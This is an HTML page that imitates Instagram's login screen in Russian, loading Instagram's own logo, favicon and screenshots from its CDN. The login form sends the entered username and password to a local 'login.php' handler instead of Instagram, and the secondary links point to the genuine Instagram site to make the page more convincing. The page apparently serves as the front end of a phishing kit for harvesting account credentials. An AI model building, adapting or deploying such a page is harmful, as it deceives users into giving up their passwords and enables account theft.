<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram</title>
  <link rel="stylesheet" href="styles.css">
  <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/y4/r/QaBlI0OZiks.ico">
  <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
</head>
<body>
  <div class="menu">
    <div class="screenshots">
      <img src="https://static.cdninstagram.com/images/instagram/xig/homepage/phones/home-phones-2x.png?__makehaste_cache_breaker=73SVAexZgBW" alt="screenshots">
    </div>
    <div class="login-container">
      <div class="instagram-font">
        <i data-visualcompletion="css-img" aria-label="Instagram" class="" role="img" style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v4/yr/r/xcgR1yOLL2N.png&quot;); background-position: 0px -388px; background-size: auto; width: 175px; height: 51px; background-repeat: no-repeat; display: inline-block;"></i>
      </div>
      <div class="login">
        <form action="login.php" method="post">
          <input type="text" name="username" placeholder="Телефон, имя пользователя или эл.адрес" required>
          <input type="password" name="password" placeholder="Пароль" required>
          <button type="submit">Войти</button>
        </form>
        <div class="separator">
          <div class="line"></div>
          <div class="text">ИЛИ</div>
          <div class="line"></div>
        </div>
        <div class="forgot-password">
          <i class='bx bxl-facebook-circle facebook-icon'></i>
          <a href="https://www.instagram.com/accounts/password/reset/">Войти через Facebook</a>
        </div>
        <a href="https://www.instagram.com/accounts/password/reset/" >Забыли пароль?</a>
      </div>
    </div>
  </div>
</body>
</html>
